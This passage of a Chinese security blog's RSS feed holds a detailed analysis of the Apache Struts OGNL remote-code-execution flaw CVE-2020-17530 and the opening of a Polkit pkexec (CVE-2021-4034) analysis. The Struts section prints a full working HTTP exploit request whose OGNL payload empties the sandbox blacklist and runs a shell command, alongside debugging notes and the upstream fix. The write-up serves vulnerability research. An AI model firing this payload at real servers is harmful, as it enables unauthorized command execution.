&lt;p>&lt;strong>Created at 2023-12-12T11:18:52+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-21746 Windows NTLM Privilege Escalation</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</link><pubDate>Mon, 11 Dec 2023 16:02:36 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/</guid><description>&lt;p>&lt;strong>Created at 2023-12-11T16:02:36+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2020-17530 Apache Struts OGNL RCE分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</link><pubDate>Mon, 04 Dec 2023 19:21:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Struts2 会对某些标签属性(比如 &lt;code>id&lt;/code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了 &lt;code>%{x}&lt;/code> 且 &lt;code>x&lt;/code> 的值用户可控时，用户再传入一个 &lt;code>%{payload}&lt;/code> 即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;pre tabindex="0">&lt;code>struts 2.0.0 - struts 2.5.25
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;p>使用docker compose启动容器，在docker-compose.yml中加入如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
&lt;/code>&lt;/pre>&lt;p>而后使用IDEA开启远程调试，对于JAVA8，需要去除address的&lt;code>*:&lt;/code>&lt;/p>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;h4 id="静态分析">静态分析&lt;/h4>
&lt;p>首先分析PoC，观察PoC可以知道，PoC通过表达式声明了&lt;code>instancemanager&lt;/code>变量，类型为&lt;code>org.apache.tomcat.InstanceManager&lt;/code>，而后通过&lt;code>instancemanager.newInstance&lt;/code>实例化&lt;code>org.apache.commons.collections.BeanMap&lt;/code>对象，并通过bean.setBean方法将&lt;code>com.opensymphony.xwork2.util.ValueStack.ValueStack&lt;/code>设置到bean中。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /index.action &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">192.168.59.211:8080&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User-Agent&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Language&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,en-US;q=0.7,en;q=0.3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Accept-Encoding&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Referer&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">http://192.168.59.211:8080/.action;jsessionid=node010obz75lhtwqg1daa8msd7zvl70.node0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cookie&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">i_like_gitea=94b6fe5fe1049e19; lang=zh-CN; redirect_to=%2F; JSESSIONID=node014s7soaddt6u41im2x0qfyngjk1.node0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Upgrade-Insecure-Requests&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Pragma&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Cache-Control&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">827&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;id&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>%{(#instancemanager=#application[&amp;#34;org.apache.tomcat.InstanceManager&amp;#34;]).(#stack=#attr[&amp;#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&amp;#34;]).(#bean=#instancemanager.newInstance(&amp;#34;org.apache.commons.collections.BeanMap&amp;#34;)).(#bean.setBean(#stack)).(#context=#bean.get(&amp;#34;context&amp;#34;)).(#bean.setBean(#context)).(#macc=#bean.get(&amp;#34;memberAccess&amp;#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&amp;#34;java.util.HashSet&amp;#34;)).(#bean.put(&amp;#34;excludedClasses&amp;#34;,#emptyset)).(#bean.put(&amp;#34;excludedPackageNames&amp;#34;,#emptyset)).(#arglist=#instancemanager.newInstance(&amp;#34;java.util.ArrayList&amp;#34;)).(#arglist.add(&amp;#34;id&amp;#34;)).(#execute=#instancemanager.newInstance(&amp;#34;freemarker.template.utility.Execute&amp;#34;)).(#execute.exec(#arglist))}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>com.opensymphony.xwork2.util.ValueStack.ValueStack&lt;/code>中存储了当前请求相关的一些对象，如下图解释，来自
&lt;a href="https://www.cnblogs.com/xtdxs/p/6527380.html" target="_blank">https://www.cnblogs.com/xtdxs/p/6527380.html&lt;/a>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/4.png" />&lt;/p>
&lt;p>而后分别通过&lt;code>bean.setBean&lt;/code>和&lt;code>bean.get&lt;/code>获取到了对象获取到了&lt;code>com.opensymphony.xwork2.util.ValueStack.ValueStack.context&lt;/code>，实际上就是下面这个对象&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/3.png" />&lt;/p>
&lt;p>继续通过以上方式使用&lt;code>bean.get&lt;/code>获取&lt;code>SecurityMemberAccess&lt;/code>对象，而后通过bean.put方法设置&lt;code>SecurityMemberAccess.excludedPackageNames&lt;/code>和&lt;code>SecurityMemberAccess.excludedClasses&lt;/code>为空。&lt;/p>
&lt;p>最后通过&lt;code>freemarker.template.utility.Execute.exec&lt;/code>执行Shell 命令。&lt;/p>
&lt;p>整体来看，该漏洞利用思路是通过Bean的get/set方法间接获取到OgnlContext，而后通过OgnlContext获取到SecurityMemberAccess对象并把里面的黑名单置空，最后调用黑名单中的&lt;code>freemarker.template.utility.Execute.exec&lt;/code>执行命令。&lt;/p>
&lt;h4 id="动态调试">动态调试&lt;/h4>
&lt;p>使用docker启动环境后，拷贝里面的关键jar包，新建IDEA项目，导入jar包，开启远程调试。&lt;/p>
&lt;p>在&lt;code>org.apache.commons.collections.BeanMap&lt;/code>构造函数下断点，运行PoC，IDEA断下，可以看到有如下&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/1.png" />&lt;/p>
&lt;p>调用栈如下：&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/2.png" />&lt;/p>
&lt;p>在&lt;code>compileAndExecute:523, OgnlUtil (com.opensymphony.xwork2.ognl)&lt;/code>中看到传入的payload已经被解析为了AST链。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/5.png" />&lt;/p>
&lt;p>而后在&lt;code>getValueBody:141, ASTChain (ognl) [1]&lt;/code>通过循环，遍历处理&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> Object &lt;span style="color:#a6e22e">getValueBody&lt;/span>(OgnlContext context, Object source) &lt;span style="color:#66d9ef">throws&lt;/span> OgnlException {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object result &lt;span style="color:#f92672">=&lt;/span> source;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> ilast &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">-&lt;/span> 1; i &lt;span style="color:#f92672">&amp;lt;=&lt;/span> ilast; &lt;span style="color:#f92672">++&lt;/span>i) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">boolean&lt;/span> handled &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (i &lt;span style="color:#f92672">&amp;lt;&lt;/span> ilast &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#66d9ef">instanceof&lt;/span> ASTProperty) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ASTProperty propertyNode &lt;span style="color:#f92672">=&lt;/span> (ASTProperty)&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> indexType &lt;span style="color:#f92672">=&lt;/span> propertyNode.&lt;span style="color:#a6e22e">getIndexedPropertyType&lt;/span>(context, result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (indexType &lt;span style="color:#f92672">!=&lt;/span> OgnlRuntime.&lt;span style="color:#a6e22e">INDEXED_PROPERTY_NONE&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i &lt;span style="color:#f92672">+&lt;/span> 1&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#66d9ef">instanceof&lt;/span> ASTProperty) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ASTProperty indexNode &lt;span style="color:#f92672">=&lt;/span> (ASTProperty)&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i &lt;span style="color:#f92672">+&lt;/span> 1&lt;span style="color:#f92672">]&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (indexNode.&lt;span style="color:#a6e22e">isIndexedAccess&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Object index &lt;span style="color:#f92672">=&lt;/span> indexNode.&lt;span style="color:#a6e22e">getProperty&lt;/span>(context, result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (index &lt;span style="color:#66d9ef">instanceof&lt;/span> DynamicSubscript) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (indexType &lt;span style="color:#f92672">==&lt;/span> OgnlRuntime.&lt;span style="color:#a6e22e">INDEXED_PROPERTY_INT&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ......
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (indexType &lt;span style="color:#f92672">==&lt;/span> OgnlRuntime.&lt;span style="color:#a6e22e">INDEXED_PROPERTY_OBJECT&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> OgnlException(&lt;span style="color:#e6db74">&amp;#34;DynamicSubscript &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> indexNode &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39; not allowed for object indexed property &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> propertyNode &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>handled) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> OgnlRuntime.&lt;span style="color:#a6e22e">getIndexedProperty&lt;/span>(context, result, propertyNode.&lt;span style="color:#a6e22e">getProperty&lt;/span>(context, result).&lt;span style="color:#a6e22e">toString&lt;/span>(), index);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> handled &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>i;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>handled) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">_children&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>.&lt;span style="color:#a6e22e">getValue&lt;/span>(context, result);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/6.png" />&lt;/p>
&lt;p>继续运行，IDEA在&lt;code>setBean:536, BeanMap (org.apache.commons.collections)&lt;/code>断下，此时通过setBean将context存到bean对象中
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/7.png" />&lt;/p>
&lt;p>在initialise方法中会将PoC中传入的valueStack分为name和对应的get方法存储到HashMap中，可以看到context对应于&lt;code>public java.util.Map com.opensymphony.xwork2.ognl.OgnlValueStack.getContext()&lt;/code>&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/20.png" />&lt;/p>
&lt;p>而后在通过bean.get获取到context，前面知道context对应于getContext方法，通过调用这个方法获取到了stack中的context。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/8.png" />&lt;/p>
&lt;p>再次通过bean.setBean存储到bean中
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/9.png" />&lt;/p>
&lt;p>通过bean获取memverAccess，对应SecurityMemberAccess对象
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/10.png" />&lt;/p>
&lt;p>可以看到在其中已有预先初始化的黑名单类和包名，其中包括后面执行命令使用的freemarker.template
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/11.png" />&lt;/p>
&lt;p>在&lt;code>com.opensymphony.xwork2.ognl.isAccessible&lt;/code>下断点，可以看到在每次执行Ognl表达式之前都会检查包名和类名是否在黑名单内
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/12.png" />&lt;/p>
&lt;p>此时调用栈如下
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/13.png" />&lt;/p>
&lt;p>而后通过bean.put将黑名单覆盖后，在使用&lt;code>#execute=#instancemanager.newInstance(&amp;quot;freemarker.template.utility.Execute&amp;quot;)).(#execute.exec(#arglist)&lt;/code>时黑名单已经是空集了，直接通过了校验。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/14.png" />&lt;/p>
&lt;p>而后在&lt;code>freemarker.template.utility.Execute.exec&lt;/code>方法中直接通过调用&lt;code>Runtime.getRuntime().exec(aExecute)&lt;/code>执行系统命令。
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/15.png" />&lt;/p>
&lt;p>Diff对比&lt;/p>
&lt;p>在
&lt;a href="https://github.com/apache/struts/commit/0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e" target="_blank">0a75d8e8fa3e75d538fb0fcbc75473bdbff9209e&lt;/a>对比可知当字符串中不包含表达式时才会添加&lt;code>%{}&lt;/code>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/16.png" />&lt;/p>
&lt;p>并且限制了解析tag时的不安全行为
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/17.png" />&lt;/p>
&lt;p>同时将一些危险类加入黑名单中
&lt;a href="https://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94" target="_blank">https://github.com/apache/struts/commit/482af41673a3883e904ea72391a5b4a03cbd5d94&lt;/a>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2020-17530-Apache-Struts-OGNL-RCE.zh-cn.assets/18.png" />&lt;/p>
&lt;h3 id="小结">小结&lt;/h3>
&lt;p>这个漏洞利用了OGNL表达式的二次解析，注入OGNL表达式，巧妙地利用tomcat容器中的Bean类获取OGNL context，并通过Bean类的get/setBean方法重置黑名单，而后利用黑名单中的类执行任意命令。&lt;/p>
&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>
&lt;a href="https://www.anquanke.com/post/id/225252" target="_blank">https://www.anquanke.com/post/id/225252&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;strong>Created at 2023-12-04T19:21:08+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2021-4034 Polkit 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</link><pubDate>Thu, 30 Nov 2023 14:25:08 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2021-4034-polkit-eop/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Polkit是一个用于在类Unix操作系统中控制系统范围权限的组件，它为非特权进程与特权进程提供了一种通信方式。Polkit中的pkexec应用程序旨在允许非特权用户根据预定义的策略以特权用户身份运行命令。
Polkit pkexec存在本地权限提升漏洞。由于pkexec无法正确处理调用参数计数，攻击者可以通过制作环境变量来诱导pkexec执行任意代码。具有低权限的攻击者可以利用此漏洞绕过pkexec自带的安全保护措施，获取目标机器的ROOT权限。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;pre tabindex="0">&lt;code>Polkit默认安装在多个主流Linux系统上，由2009年5月发布的第一个版本引入，并影响后续所有版本。以下为CentOS及Ubuntu上的安全版本：
CentOS系列：
CentOS 6：polkit-0.96-11.el6_10.2
CentOS 7：polkit-0.112-26.el7_9.1
CentOS 8.0：polkit-0.115-13.el8_5.1
CentOS 8.2：polkit-0.115-11.el8_2.2
CentOS 8.4：polkit-0.115-11.el8_4.2
Ubuntu系列：
Ubuntu 20.04 LTS：policykit-1-0.105-26ubuntu1.2
Ubuntu 18.04 LTS：policykit-1-0.105-20ubuntu0.18.04.6
Ubuntu 16.04 ESM：policykit-1-0.105-14.1ubuntu0.5+esm1
Ubuntu 14.04 ESM：policykit-1-0.105-4ubuntu3.14.04.6+esm1
&lt;/code>&lt;/pre>&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>在
&lt;a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.120/src/programs/pkexec.c" target="_blank">源码&lt;/a>中可以看到如下：n被赋值为1，而后通过g_strdup函数在堆内分配内存并将&lt;code>argv[n]&lt;/code>复制进去，将分配到内存地址返回给path变量。当不加任何参数时，argv数组只有一个元素，而&lt;code>argv[1]&lt;/code>实际指向&lt;code>envp[0]&lt;/code>，也就是会把环境变量的第一个复制给path变量&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (n &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>; n &lt;span style="color:#f92672">&amp;lt;&lt;/span> (guint) argc; n&lt;span style="color:#f92672">++&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span> (argv[n], &lt;span style="color:#e6db74">&amp;#34;--help&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> opt_show_help &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span> (argv[n], &lt;span style="color:#e6db74">&amp;#34;--version&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> opt_show_version &lt;span style="color:#f92672">=&lt;/span> TRUE;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span> (argv[n], &lt;span style="color:#e6db74">&amp;#34;--user&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#a6e22e">strcmp&lt;/span> (argv[n], &lt;span style="color:#e6db74">&amp;#34;-u&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">g_printerr&lt;/span> (&lt;span style="color:#e6db74">&amp;#34;--user specified twice&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">goto&lt;/span> out;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> opt_user &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">g_strdup&lt;/span> (argv[n]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">strcmp&lt;/span> (argv[n], &lt;span style="color:#e6db74">&amp;#34;--disable-internal-agent&amp;#34;&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>.....
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* Now figure out the command-line to run - argv is guaranteed to be NULL-terminated, see
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * http://lkml.indiana.edu/hypermail/linux/kernel/0409.2/0287.html
